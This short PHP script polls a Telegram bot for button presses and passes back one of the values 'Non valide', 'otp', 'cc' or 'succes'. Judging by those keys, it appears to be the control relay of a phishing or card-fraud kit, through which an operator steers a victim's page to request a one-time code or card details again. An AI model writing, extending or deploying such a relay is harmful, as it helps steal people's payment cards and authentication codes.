<?php
include '../settings.php';
require __DIR__.'/vendor/autoload.php';

use Telegram\Bot\Api;

$telegram = new Api($bot_token);//Bot token
$array = $telegram->getUpdates();

if (!isset(end($array)['callback_query'])) {
    die('none');
}

$callbackData = end($array)['callback_query']['data'];

// Vérifiez si $callbackData correspond à une réponse attendue
if (in_array($callbackData, [
'Non valide', 
'otp',
'cc',
'succes'
])) // Fin des clés


{
    die($callbackData);
} else {
    // Réponse par défaut ou ne rien renvoyer si la réponse n'est pas attendue
    die('none');
}
?>
